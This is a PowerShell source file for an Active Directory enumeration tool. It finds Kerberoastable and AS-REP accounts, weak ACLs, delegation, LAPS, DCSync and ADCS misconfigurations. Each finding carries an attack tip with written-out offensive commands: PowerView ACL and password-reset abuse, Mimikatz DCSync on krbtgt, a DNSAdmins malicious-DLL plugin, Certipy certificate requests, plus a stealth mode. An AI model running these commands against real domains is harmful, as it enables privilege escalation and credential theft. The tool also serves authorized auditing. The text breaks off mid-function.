<#
.SYNOPSIS
    ADAIO - Active Directory Enumeration Tool
    Version: 1.0

.DESCRIPTION
    ADAIO is a standalone security auditing tool designed to analyze multiple critical attack surfaces within Active Directory environments and offer exploitation guidance.

    [1] IDENTITY: AS-REP, Kerberoast, Shadow Credentials, SIDHistory
    [2] ACLs: GenericAll, WriteDacl, WriteOwner, ResetPassword, AddMember, GPO Link
    [3] INFRA: Azure AD Connect, MSSQL Silver Tickets, LAPS (Legacy & v2), DNSAdmins
    [4] DOMAIN: DCSync, AdminSDHolder, GPP Passwords, Trusts, Password Policy
    [5] ADCS: ESC1, ESC2, ESC3, ESC4, ESC6

.PARAMETER OutFile
    Report name (without extension). Example: "AD_Report"

.PARAMETER Format
    JSON or Text.

.PARAMETER Stealth
    Slow scan mode.

.EXAMPLE
    .\ADAIO.ps1 -OutFile "output" -Format JSON
#>

[CmdletBinding()]
param(
    [string]$OutFile,
    [ValidateSet("Text","JSON")]
    [string]$Format = "Text",
    [switch]$Stealth
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# ---------------------------------------------------------------------------
#  GLOBAL STATE
# ---------------------------------------------------------------------------
$global:State = @{
    LogBuffer   = @()
    Findings    = @()
    BaseDN      = $null
    DomainName  = $null
    StartTime   = Get-Date
}

# ---------------------------------------------------------------------------
#  CORE FUNCTIONS
# ---------------------------------------------------------------------------

function Show-Banner {
    $banner = @"
    
    _    ____    _    ___ ___  
   / \  |  _ \  / \  |_ _/ _ \ 
  / _ \ | | | |/ _ \  | | | | |
 / ___ \| |_| / ___ \ | | |_| |
/_/   \_\____/_/   \_\___\___/                         

                                               
   :: ADEnumeration Tool ::
"@
    Write-Host $banner -ForegroundColor Magenta
    Write-Host ""
}

function Write-Line {
    param(
        [string]$Text,
        [String]$Color = "White"
    )
    Write-Host $Text -ForegroundColor $Color
    $global:State.LogBuffer += $Text
}

function Write-Section {
    param([string]$Name)
    Write-Line ""
    Write-Line ("=" * 65) "DarkGray"
    if ($Name -ne "REPORTING") {
        Write-Line ">> MODULE: $Name" "Cyan"
    }
    Write-Line ("=" * 65) "DarkGray"
}

function Add-Finding {
    param(
        [string]$Category,
        [string]$Name,
        [string]$Severity,
        [string]$Details,
        [string]$ExploitTip
    )
    
    $sevColor = switch ($Severity) { "HIGH" {"Red"} "MEDIUM" {"Yellow"} "INFO" {"Cyan"} default {"White"} }
    
    Write-Host "    [!VULN] [$Category] $Name ($Severity)" -ForegroundColor $sevColor
    Write-Host "        -> [Risk]: $Details" -ForegroundColor White
    
    if ($ExploitTip) {
        Write-Host "        -> [TTP]:  $ExploitTip" -ForegroundColor DarkGray
    }
    
    $global:State.Findings += [pscustomobject]@{
        Category   = $Category
        Name       = $Name
        Severity   = $Severity
        Details    = $Details
        Tradecraft = $ExploitTip
    }
    
    return $true
}

function Init-AD {
    Write-Line "[*] Initializing Context..."
    try {
        if (Get-Module -ListAvailable -Name ActiveDirectory) { Import-Module ActiveDirectory -ErrorAction SilentlyContinue }
        
        $root = [ADSI]"LDAP://RootDSE"
        $global:State.BaseDN = $root.defaultNamingContext
        $global:State.DomainName = $root.ldapServiceName
        
        if (-not $global:State.BaseDN) { throw "BaseDN is empty." }
        Write-Line "[+] Target Domain: $($global:State.BaseDN)" "Green"
    } catch {
        Write-Line "[!] Critical: Cannot connect to LDAP." "Red" ; exit
    }
}

function Search-LDAP {
    param(
        [string]$Filter, 
        [string[]]$Properties = @("*"),
        [switch]$LoadDacl
    )
    
    if ($Stealth) { Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 500) }
    
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    try {
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($global:State.BaseDN)")
        $searcher.PageSize = 1000
        $searcher.Filter = $Filter
        
        if ($LoadDacl) {
            $searcher.SecurityMasks = "Dacl"
        }

        foreach ($p in $Properties) { [void]$searcher.PropertiesToLoad.Add($p) }
        
        $rawResults = $searcher.FindAll()
        $cleanOutput = @()

        foreach ($result in $rawResults) {
            $propBag = @{}
            
            foreach ($propName in $result.Properties.PropertyNames) {

                $propBag[$propName] = @($result.Properties[$propName])
            }

            $obj = [PSCustomObject]@{
                Properties = $propBag
                Path = $result.Path
            }
            
            $cleanOutput += $obj
        }

        return $cleanOutput

    } catch { 
        return @() 
    } finally {
        $searcher.Dispose()
    }
}

# ---------------------------------------------------------------------------
#  MODULES
# ---------------------------------------------------------------------------

function Enum-DomainPolicy {
    Write-Section "Domain Policy & Constraints"
    $found = $false
    
    try {
        $dom = Search-LDAP -Filter "(objectClass=domainDNS)" -Properties @("ms-DS-MachineAccountQuota", "maxPwdAge", "minPwdLength", "lockoutThreshold")
        
        # 1. MAQ Check
        $maq = $dom[0].Properties["ms-ds-machineaccountquota"][0]
        if ($maq -gt 0) {
            Add-Finding "Policy" "MachineAccountQuota = $maq" "HIGH" "Any user can create computer accounts." "Required for RBCD & NoPac." | Out-Null
            $found = $true
        }

        # 2. Password Policy Check
        $minLen  = if($dom[0].Properties["minpwdlength"]) { $dom[0].Properties["minpwdlength"][0] } else { 0 }
        $lockout = if($dom[0].Properties["lockoutthreshold"]) { $dom[0].Properties["lockoutthreshold"][0] } else { 0 }
        
        $maxAge = "Unlimited"
        if ($dom[0].Properties["maxpwdage"]) {
            $ticks = [Math]::Abs($dom[0].Properties["maxpwdage"][0])
            if ($ticks -gt 0) { $maxAge = [TimeSpan]::FromTicks($ticks).TotalDays.ToString("0") + " days" }
        }

        $polDetail = "MinLen: $minLen, Lockout: $lockout, MaxAge: $maxAge"

        if ($lockout -eq 0) {
            Add-Finding "Policy" "Weak Password Policy (No Lockout)" "MEDIUM" $polDetail "Lockout is 0. Perform Password Spraying freely." | Out-Null
            $found = $true
        } else {
            Write-Line "    [*] Password Policy: $polDetail" "Gray"
        }

    } catch {}

    if (-not $found) { Write-Line "    [-] No critical policy misconfigurations found." "DarkGray" }
}

function Enum-Identity {
    Write-Section "Identity Vectors"
    $found = $false

    # 1. AS-REP ROASTING
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($global:State.BaseDN)")
    $searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $results = $searcher.FindAll()

    foreach ($res in $results) {
        $name = if ($res.Properties["samaccountname"].Count -gt 0) { $res.Properties["samaccountname"][0] } else { "Unknown" }
        Add-Finding "AS-REP" $name "MEDIUM" "Pre-Auth Disabled." "Hashcat Mode: 18200. Tool: Rubeus asreproast" | Out-Null
        $found = $true
    }
    $searcher.Dispose()

    # 2. KERBEROASTING
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($global:State.BaseDN)")
    $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
    $searcher.PageSize = 1000
    
    [void]$searcher.PropertiesToLoad.Add("samaccountname")
    [void]$searcher.PropertiesToLoad.Add("serviceprincipalname")
    [void]$searcher.PropertiesToLoad.Add("admincount")
    [void]$searcher.PropertiesToLoad.Add("pwdlastset")

    try {
        $results = $searcher.FindAll()
        
        foreach ($res in $results) {
            if ($res.Properties["samaccountname"].Count -eq 0) { continue }
            $name = $res.Properties["samaccountname"][0]
            
            if ($name -eq "krbtgt") { continue }

            $isHigh = $false
            if ($res.Properties["admincount"].Count -gt 0) {
                if ($res.Properties["admincount"][0] -eq 1) { $isHigh = $true }
            }

            $pwdAge = "Unknown"
            if ($res.Properties["pwdlastset"].Count -gt 0) {
                try {
                    $lastSet = [DateTime]::FromFileTime($res.Properties["pwdlastset"][0])
                    $days = [int]((Get-Date) - $lastSet).TotalDays
                    $pwdAge = "$days days"
                } catch {}
            }

            $severity = "MEDIUM"
            if ($isHigh) { $severity = "HIGH" }

            Add-Finding "Kerberoast" $name $severity "SPN Account. PwdAge: $pwdAge." "Hashcat Mode: 13100. Tool: Rubeus kerberoast" | Out-Null
            $found = $true
        }
    } catch {
        Write-Host "   [!] LDAP Error: $($_.Exception.Message)" -ForegroundColor Red
    } finally {
        $searcher.Dispose()
    }

    if (-not $found) { Write-Line "    [-] No AS-REP or Kerberoastable accounts found." "DarkGray" }
}

function Enum-SIDHistory {
    Write-Section "SIDHistory Injection"
    $found = $false
    $res = Search-LDAP -Filter "(sIDHistory=*)" -Properties @("samaccountname")
    foreach ($r in $res) { 
        Add-Finding "SIDHistory" $r.Properties["samaccountname"][0] "MEDIUM" "sIDHistory populated." "Check for lateral movement persistence." | Out-Null
        $found = $true
    }
    if (-not $found) { Write-Line "    [-] No objects with sIDHistory found." "DarkGray" }
}

function Enum-ACLPrivilege {
    Write-Section "ACL Analysis"
    Write-Line "    [*] Scanning Domain Root, Users, Groups, GPOs..." "Gray"
    $found = $false

    # -----------------------------------------------------------------------
    # STEP 0: ANALYZE CURRENT USER TOKEN
    # -----------------------------------------------------------------------
    $myIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $mySIDs = @($myIdentity.User.Value)
    foreach ($g in $myIdentity.Groups) { $mySIDs += $g.Value }
    
    Write-Line "    [*] Analyzed current user token. Tracking $($mySIDs.Count) nested group SIDs." "Gray"

    # CONSTANTS
    $GENERIC_ALL    = 0x10000000
    $EXCHANGE_FULL  = 983551      # 0x000F01FF (Mapped GenericAll in AD)
    $WRITE_DACL     = 0x00040000
    $WRITE_OWNER    = 0x00080000
    $GENERIC_WRITE  = 0x40000000
    $WRITE_PROP     = 0x00000020
    $EXTENDED_RIGHT = 0x00000010 
    
    $GUID_RESET_PWD = "00299570-246d-11d0-a768-00aa006e0529"
    $GUID_MEMBER    = "bf967a9c-0de6-11d0-a285-00aa003049e2"
    $GUID_GPLINK    = "f30e3bc2-9ca0-11d1-b603-0000f80367c1"
    $GUID_SPN       = "28630eb0-41d5-11d1-a9c1-0000f80367c1"

    # -----------------------------------------------------------------------
    # STEP 1: DOMAIN ROOT SCAN
    # -----------------------------------------------------------------------
    try {
        $domDN = $global:State.BaseDN
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domDN")
        $searcher.SearchScope = "Base" 
        $searcher.Filter = "(objectClass=domainDNS)"
        $searcher.SecurityMasks = "Dacl"
        [void]$searcher.PropertiesToLoad.Add("ntsecuritydescriptor")
        
        $rootResult = $searcher.FindOne()
        
        if ($rootResult) {
            $sdBytes = $rootResult.Properties["ntsecuritydescriptor"][0]
            $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor ($sdBytes, 0)
            
            $rootReported = @{}

            foreach ($ace in $sd.DiscretionaryAcl) {
                $sid = $ace.SecurityIdentifier.Value
                $mask = [int]$ace.AccessMask
                
                # Filter Noise: 512(DA), 519(EA), 18(System), 544(Administrators)
                if ($sid -match "-512$" -or $sid -match "-519$" -or $sid -match "-18$" -or $sid -match "-544$") { continue }
                
                $isMe = if ($mySIDs -contains $sid) { " [YOU HAVE THIS]" } else { "" }
                
                # [FIX]: GenericAll OR 983551 Check
                if ( ($mask -band $GENERIC_ALL) -ne 0 -or $mask -eq $EXCHANGE_FULL ) {
                    $dedupKey = "$sid-GenericAll-Root"
                    if (-not $rootReported[$dedupKey]) {
                        $principalName = $sid
                        try { $principalName = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch {}
                        Add-Finding "ACL" "$principalName -> $domDN (DOMAIN ROOT)$isMe" "HIGH" "GenericAll (Full Control)." "You own this object." | Out-Null; $found = $true
                        
                        $rootReported[$dedupKey] = $true
                        $rootReported["$sid-WriteDacl-Root"] = $true
                    }
                    continue
                }

                if (($mask -band $WRITE_DACL) -ne 0) { 
                    $dedupKey = "$sid-WriteDacl-Root"
                    if (-not $rootReported[$dedupKey]) {
                        $principalName = $sid
                        try { $principalName = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch {}
                        Add-Finding "ACL" "$principalName -> $domDN (DOMAIN ROOT)$isMe" "HIGH" "WriteDacl on Domain Root." "PV: Add-DomainObjectAcl -TargetIdentity '$domDN' -PrincipalIdentity '$principalName' -Rights DCSync" | Out-Null; $found = $true
                        $rootReported[$dedupKey] = $true
                    }
                }
            }
        }
    } catch {
        Write-Line "    [!] Error scanning Domain Root: $($_.Exception.Message)" "Red"
    }

    # -----------------------------------------------------------------------
    # STEP 2: STANDARD OBJECT SCAN
    # -----------------------------------------------------------------------
    $filter = "(|(objectClass=user)(objectClass=computer)(objectClass=group)(objectClass=groupPolicyContainer)(objectClass=organizationalUnit))"
    $res = Search-LDAP -Filter $filter -Properties @("ntsecuritydescriptor","samaccountname","displayname","objectclass","distinguishedname","name") -LoadDacl

    foreach ($entry in $res) {
        if ($Stealth) { Start-Sleep -Milliseconds 10 }
        
        $rawSD = $entry.Properties["ntsecuritydescriptor"]
        if (-not $rawSD) { continue }
        
        $targetName = if($entry.Properties["samaccountname"]) { $entry.Properties["samaccountname"][0] } else { $entry.Properties["name"][0] }
        $targetDN   = $entry.Properties["distinguishedname"][0]
        
        $classes = $entry.Properties["objectclass"]
        $type = "Object"
        if ($classes -contains "user") { $type = "User" } elseif ($classes -contains "computer") { $type = "Computer" }
        elseif ($classes -contains "group") { $type = "Group" } elseif ($classes -contains "groupPolicyContainer") { $type = "GPO" }
        elseif ($classes -contains "organizationalUnit") { $type = "OU" }

        try {
            $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor ($rawSD[0], 0)
            $objReported = @{}

            foreach ($ace in $sd.DiscretionaryAcl) {
                $mask = [int]$ace.AccessMask; $sid = $ace.SecurityIdentifier.Value
                $aceGuid = if ($ace.ObjectType) { $ace.ObjectType.ToString() } else { $null }

                # Filter Noise: 512(DA), 519(EA), 18(System), 544(Administrators)
                if ($sid -match "-512$" -or $sid -match "-519$" -or $sid -match "-18$" -or $sid -match "-544$") { continue }

                $isMe = if ($mySIDs -contains $sid) { " [YOU HAVE THIS]" } else { "" }
                
                # --- 1. PRIORITY RIGHTS ---
                
                # [FIX]: GenericAll OR 983551 Check
                if ( ($mask -band $GENERIC_ALL) -ne 0 -or $mask -eq $EXCHANGE_FULL ) {
                     $k = "$sid-GenericAll"
                     if (-not $objReported[$k]) {
                        Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "GenericAll (Full Control)." "You own this object. Full Control." | Out-Null; $found = $true
                        
                        $objReported[$k] = $true
                        $objReported["$sid-WriteDacl"] = $true
                        $objReported["$sid-WriteOwner"] = $true
                     }
                     continue 
                }

                if (($mask -band $WRITE_DACL) -ne 0) {
                     $k = "$sid-WriteDacl"
                     if (-not $objReported[$k]) {
                        Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "WriteDacl (Change Perms)." "PV: Add-DomainObjectAcl -TargetIdentity '$targetDN' -PrincipalIdentity '$sid' -Rights All" | Out-Null; $found = $true
                        $objReported[$k] = $true
                     }
                }
                
                if (($mask -band $WRITE_OWNER) -ne 0) {
                     $k = "$sid-WriteOwner"
                     if (-not $objReported[$k]) {
                        Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "WriteOwner (Take Ownership)." "PV: Set-DomainObjectOwner -TargetIdentity '$targetDN' -PrincipalIdentity '$sid'" | Out-Null; $found = $true
                        $objReported[$k] = $true
                     }
                }
                
                if (($mask -band $GENERIC_WRITE) -ne 0 -and $isMe) { 
                     $k = "$sid-GenericWrite"
                     if (-not $objReported[$k]) {
                        Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "MEDIUM" "GenericWrite." "Can update properties." | Out-Null; $found = $true
                        $objReported[$k] = $true
                     }
                }
                
                # --- 2. PROPERTY WRITES ---
                if (($mask -band $WRITE_PROP) -ne 0) {
                    if ($type -eq "Group" -and ($aceGuid -eq $GUID_MEMBER -or $aceGuid -eq $null)) { 
                        $k = "$sid-AddMember"
                        if (-not $objReported[$k]) {
                            Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "WriteProperty: Member." "net group `"$targetName`" '$env:USERNAME' /add /domain" | Out-Null; $found = $true
                            $objReported[$k] = $true
                        }
                    }
                    if (($type -eq "User" -or $type -eq "Computer") -and ($aceGuid -eq $GUID_SPN)) {
                        $k = "$sid-WriteSPN"
                        if (-not $objReported[$k]) {
                            Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "WriteProperty: SPN." "PowerView: Set-DomainObject -Identity '$targetName' -Set @{serviceprincipalname='hack/test'}" | Out-Null; $found = $true
                            $objReported[$k] = $true
                        }
                    }
                    if ($type -eq "OU" -and ($aceGuid -eq $GUID_GPLINK)) {
                        $k = "$sid-GPLink"
                        if (-not $objReported[$k]) {
                            Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "WriteProperty: gPLink." "PowerView: New-GPLink -Name 'MaliciousGPO' -Target '$targetDN'" | Out-Null; $found = $true
                            $objReported[$k] = $true
                        }
                    }
                }

                # --- 3. EXTENDED RIGHTS ---
                if (($mask -band $EXTENDED_RIGHT) -ne 0) {
                    if ($aceGuid -eq $GUID_RESET_PWD) {
                        $k = "$sid-ResetPwd"
                        if (-not $objReported[$k]) {
                            Add-Finding "ACL" "$sid -> $targetName ($type)$isMe" "HIGH" "ExtendedRight: Reset Password." "PowerView: Set-DomainUserPassword -Identity '$targetName' -Account '$sid' -NewPassword 'P@ssw0rd!'" | Out-Null; $found = $true
                            $objReported[$k] = $true
                        }
                    }
                }
            }
        } catch {}
    }
    if (-not $found) { Write-Line "    [-] No critical ACL misconfigurations found." "DarkGray" }
}

function Enum-ShadowCredentials {
    Write-Section "Shadow Credentials"
    $found = $false
    $res = Search-LDAP -Filter "(msDS-KeyCredentialLink=*)" -Properties @("name")
    foreach ($r in $res) { 
        Add-Finding "ShadowCred" $r.Properties["name"][0] "HIGH" "KeyCredentialLink populated." "Whisker.exe list /target:$($r.Properties["name"][0])" | Out-Null; $found = $true
    }
    if (-not $found) { Write-Line "    [-] No Shadow Credentials found." "DarkGray" }
}

function Enum-Infrastructure {
    Write-Section "Infrastructure & SQL"
    $found = $false
    
    $res = Search-LDAP -Filter "(|(sAMAccountName=MSOL_*)(servicePrincipalName=aadconnect*))" -Properties @("samaccountname")
    foreach ($r in $res) { 
        Add-Finding "Hybrid" $r.Properties["samaccountname"][0] "HIGH" "Azure AD Connect Sync Account." "Dump DB for Azure Creds." | Out-Null; $found = $true
    }

    $res = Search-LDAP -Filter "(&(servicePrincipalName=MSSQLSvc*)(objectClass=user))" -Properties @("samaccountname")
    foreach ($r in $res) { 
        Add-Finding "MSSQL" $r.Properties["samaccountname"][0] "HIGH" "MSSQL Service running as User." "Silver Ticket Target." | Out-Null; $found = $true
    }

    $dnsGroup = Search-LDAP -Filter "(&(objectClass=group)(cn=DNSAdmins))" -Properties @("member")
    if ($dnsGroup.Count -gt 0) {
        foreach ($member in $dnsGroup[0].Properties["member"]) {
            $mName = ($member -split ",")[0] -replace "CN=",""
            Add-Finding "Infra" "DNSAdmins Member: $mName" "HIGH" "Member of DNSAdmins." "Attack: dnscmd.exe /config /serverlevelplugindll \\malicious\dll" | Out-Null; $found = $true
        }
    }

    if (-not $found) { Write-Line "    [-] No obvious Infrastructure vulnerabilities found." "DarkGray" }
}

function Enum-Delegation {
    Write-Section "Delegation"
    $found = $false
    
    $u = Search-LDAP -Filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties @("samaccountname")
    foreach ($r in $u) { 
        Add-Finding "Delegation" $r.Properties["samaccountname"][0] "HIGH" "Unconstrained Delegation." "Coerce Auth (PetitPotam) -> Dump TGT." | Out-Null; $found = $true 
    }
    
    $c = Search-LDAP -Filter "(msDS-AllowedToDelegateTo=*)" -Properties @("samaccountname")
    foreach ($r in $c) { 
        Add-Finding "Delegation" $r.Properties["samaccountname"][0] "MEDIUM" "Constrained Delegation (S4U)." $null | Out-Null; $found = $true 
    }
    
    $r = Search-LDAP -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -Properties @("samaccountname")
    foreach ($e in $r) { 
        Add-Finding "Delegation" $e.Properties["samaccountname"][0] "MEDIUM" "RBCD Configured." "Check Write perms for RBCD attack." | Out-Null; $found = $true 
    }
    
    if (-not $found) { Write-Line "    [-] No dangerous Delegation configs found." "DarkGray" }
}

function Enum-LAPS {
    Write-Section "LAPS Dumping (Legacy & v2)"
    $found = $false
    $GUID_LAPS_V1 = "bf9679c0-0de6-11d0-a285-00aa003049e2"; $GUID_LAPS_V2 = "0046a362-d273-421c-ad66-0080c796798e"
    
    $comps = Search-LDAP -Filter "(&(objectCategory=computer)(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)))" -Properties @("ntsecuritydescriptor","name")
    if ($comps.Count -eq 0) { $comps = Search-LDAP -Filter "(objectCategory=computer)" -Properties @("ntsecuritydescriptor","name") }

    foreach ($c in $comps) {
        $raw = $c.Properties["ntsecuritydescriptor"]
        if (-not $raw) { continue }
        try {
            $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor ($raw[0], 0)
            foreach ($ace in $sd.DiscretionaryAcl) {
                if ($ace.ObjectType) {
                    $ag = $ace.ObjectType.ToString()
                    if ($ag -eq $GUID_LAPS_V1 -or $ag -eq $GUID_LAPS_V2) {
                        $sid = $ace.SecurityIdentifier.Value
                        if ($sid -match "-512$" -or $sid -match "-519$" -or $sid -match "-18$") { continue } 
                        Add-Finding "LAPS" "$sid -> $($c.Properties["name"][0])" "HIGH" "Can read LAPS password." "PowerView: Get-DomainComputer -Identity TARGET -Properties ms-mcs-admpwd" | Out-Null; $found = $true
                    }
                }
            }
        } catch {}
    }
    if (-not $found) { Write-Line "    [-] No unauthorized LAPS readers found." "DarkGray" }
}

function Enum-DCSync {
    Write-Section "DCSync Rights"
    $found = $false
    try {
        $domDN = $global:State.BaseDN
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domDN"; $searcher.SearchScope = "Base"; $searcher.SecurityMasks = "Dacl"
        $domObj = $searcher.FindOne()
        $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor ($domObj.Properties["ntsecuritydescriptor"][0], 0)
        $DCSyncGUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"

        foreach ($ace in $sd.DiscretionaryAcl) {
            if ($ace.ObjectType -and $ace.ObjectType.ToString() -eq $DCSyncGUID) {
                $sid = $ace.SecurityIdentifier.Value
                if ($sid -match "-516$" -or $sid -match "-512$") { continue }
                Add-Finding "DCSync" $sid "HIGH" "Principal has DCSync rights." "Mimikatz: 'lsadump::dcsync /domain:$global:State.BaseDN /user:krbtgt'" | Out-Null; $found = $true
            }
        }
    } catch {}
    if (-not $found) { Write-Line "    [-] No non-admin DCSync rights found." "DarkGray" }
}

function Enum-AdminSDHolder {
    Write-Section "AdminSDHolder"
    $res = Search-LDAP -Filter "(cn=AdminSDHolder)" -Properties @("distinguishedname")
    if ($res.Count -gt 0) { 
        Write-Line "    [*] AdminSDHolder found. Check ACLs manually for persistence." "Gray" 
    } else { 
        Write-Line "    [-] AdminSDHolder object not found (Unexpected)." "DarkGray" 
    }
}

function Enum-GPO-Passwords {
    Write-Section "GPO Passwords (SYSVOL)"
    $found = $false
    try {
        $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $sysvol = "\\$($dom.Name)\SYSVOL"
        if (Test-Path $sysvol) {
            $files = Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","ScheduledTasks.xml" -ErrorAction SilentlyContinue
            foreach ($f in $files) {
                $content = Get-Content $f.FullName -Raw
                if ($content -match "cpassword") { 
                    Add-Finding "GPO" $f.FullName "HIGH" "GPP Password found in XML." "Use 'gpp-decrypt' to recover password." | Out-Null; $found = $true 
                }
            }
        }
    } catch {}
    if (-not $found) { Write-Line "    [-] No GPP passwords found in SYSVOL." "DarkGray" }
}

function Enum-ADCS {
    Write-Section "ADCS & Certificate Vectors (ESC1, ESC2, ESC3, ESC4, ESC6)"
    
    $root = [ADSI]"LDAP://RootDSE"; $config = $root.configurationNamingContext
    
    # --- 1. ENTERPRISE CA & ESC6 (SAN ABUSE) ---
    try {
        $caBase = "CN=Enrollment Services,CN=Public Key Services,CN=Services," + $config
        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$caBase")
        $searcher.Filter = "(objectClass=pKIEnrollmentService)"; $searcher.PropertiesToLoad.AddRange(@("name", "dnshostname", "flags"))
        $cas = $searcher.FindAll()
        
        if ($cas.Count -eq 0) { Write-Line "    [-] No Enterprise CAs found."; return }

        foreach ($ca in $cas) {
            $caName = $ca.Properties["name"][0]; $dns = $ca.Properties["dnshostname"][0]
            $flags = if ($ca.Properties["flags"]) { [int]$ca.Properties["flags"][0] } else { 0 }
            
            # ESC6 Check: EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000)
            if (($flags -band 0x40000) -ne 0) {
                 Add-Finding "ADCS" "$caName (ESC6)" "HIGH" "CA allows User Specified SAN." "Certipy req -ca $caName -template User -target $dns -upn admin@domain"
            } else {
                 Add-Finding "ADCS" $caName "INFO" "Enterprise CA detected." $null
            }
        }
    } catch {}

    # --- 2. TEMPLATE ANALYSIS (ESC1, ESC2, ESC3, ESC4) ---
    Write-Line "    [*] Analyzing Certificate Templates..."
    $tplBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services," + $config
    $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$tplBase")
    $searcher.Filter = "(objectClass=pKICertificateTemplate)"; $searcher.SecurityMasks = "Dacl"
    $searcher.PropertiesToLoad.AddRange(@("name", "ntsecuritydescriptor", "msPKI-Certificate-Name-Flag", "pKIExtendedKeyUsage", "msPKI-Enrollment-Flag"))
    $templates = $searcher.FindAll()

    foreach ($t in $templates) {
        $name = $t.Properties["name"][0]
        
        $nameFlag = if ($t.Properties["mspki-certificate-name-flag"]) { [int]$t.Properties["mspki-certificate-name-flag"][0] } else { 0 }
        $enrollFlag = if ($t.Properties["mspki-enrollment-flag"]) { [int]$t.Properties["mspki-enrollment-flag"][0] } else { 0 }
        $ekus = $t.Properties["pkiextendedkeyusage"]
        
        # Flags
        $enrolleeSuppliesSubject = ($nameFlag -band 1) -eq 1
        $requiresApproval = ($enrollFlag -band 2) -eq 2
        
        # EKU Analysis
        $hasClientAuth = $false
        $hasEnrollmentAgent = $false # ESC3
        $hasAnyPurpose = $false      # ESC2

        if (-not $ekus) {
            $hasAnyPurpose = $true
            $hasClientAuth = $true
        } else {
            foreach ($e in $ekus) { 
                # Client Authentication OIDs
                if ($e -eq "1.3.6.1.5.5.7.3.2") { $hasClientAuth = $true }      # Client Auth
                if ($e -eq "1.3.6.1.4.1.311.20.2.2") { $hasClientAuth = $true } # Smart Card Logon
                if ($e -eq "1.3.6.1.5.2.3.4") { $hasClientAuth = $true }        # PKINIT Client Auth
                
                # Enrollment Agent OID
                if ($e -eq "1.3.6.1.4.1.311.20.2.1") { $hasEnrollmentAgent = $true } 
                
                # Any Purpose OID
                if ($e -eq "2.5.29.37.0") { 
                    $hasAnyPurpose = $true 
                    $hasClientAuth = $true
                } 
            } 
        }

        # ESC1: Client Auth + Supply Subject + No Approval
        if ($enrolleeSuppliesSubject -and $hasClientAuth -and (-not $requiresApproval)) {
             Add-Finding "ADCS" "$name (ESC1)" "HIGH" "Client Auth + Enrollee Supplies Subject." "Certipy req -template $name -ca <CA> -upn admin@target"
        }

        # ESC2: Any Purpose EKU (or No EKU) + No Approval
        if ($hasAnyPurpose -and (-not $requiresApproval)) {
             Add-Finding "ADCS" "$name (ESC2)" "HIGH" "Template has 'Any Purpose' EKU or No EKU defined." "Certipy req -template $name -ca <CA> ... (Use as CA cert)"
        }

        # ESC3: Enrollment Agent + No Approval
        if ($hasEnrollmentAgent -and (-not $requiresApproval)) {
             Add-Finding "ADCS" "$name (ESC3)" "HIGH" "Enrollment Agent Template (Request on behalf of others)." "Certipy req -template $name -ca <CA> ... then use to request other certs."
        }

        # ESC4: Vulnerable ACLs on Template
        $rawSD = $t.Properties["ntsecuritydescriptor"]
        if ($rawSD) {
            $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor ($rawSD[0], 0)
            foreach ($ace in $sd.DiscretionaryAcl) {
                $mask = $ace.AccessMask; $sid = $ace.SecurityIdentifier.Value
                
                # WriteOwner, WriteDacl, GenericAll
                if (($mask -band 0x10000000) -or ($mask -band 0x00040000) -or ($mask -band 0x00080000)) {
                    # Filter: Domain Admins, Enterprise Admins, SYSTEM
                    if ($sid -match "-512$" -or $sid -match "-519$" -or $sid -match "-518$") { continue }
                    
                    Add-Finding "ADCS" "$sid -> $name (ESC4)" "HIGH" "Write Access on Template." "Certipy template -template $name -save-old -configuration <JSON>"
                }
            }
        }
    }
}

function Enum-Exchange {
    Write-Section "Exchange Privileges"
    $found = $false
    $groups = Search-LDAP -Filter "(|(cn=Exchange Trusted Subsystem)(cn=Exchange Windows Permissions))" -Properties @("member","name")
    
    foreach ($g in $groups) {
        if ($g.Properties["member"]) {
            foreach ($m in $g.Properties["member"]) {
                $mName = ($m -split ",")[0].Replace("CN=","")
                if ($mName -notmatch "\$$") { 
                    Add-Finding "Exchange" "User in $($g.Properties["name"][0]): $mName" "HIGH" "User in Privileged Exchange Group." "Likely DCSync via Exchange permissions." | Out-Null; $found = $true
                }
            }
        }
    }
    if (-not $found) { Write-Line "    [-] No risky Exchange group memberships found." "DarkGray" }
}

function Enum-Trusts {
    Write-Section "Domain Trusts"
    $found = $false
